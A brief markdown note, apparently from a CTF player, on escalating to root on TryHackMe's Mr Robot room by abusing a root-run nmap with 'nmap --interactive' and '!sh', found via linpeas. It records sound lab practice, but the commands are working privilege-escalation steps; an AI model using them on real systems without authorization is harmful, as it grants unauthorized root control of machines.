# Nmap

If nmap is able to run as root the the following can be run to get root


``` bash
nmap --interactive

# This will bring up an interactive session on the terminal

!sh

# This will bring up a root session


```

I used this on tryhackme's MrRobot CTF after seeing it being exploitable using linpeas.sh
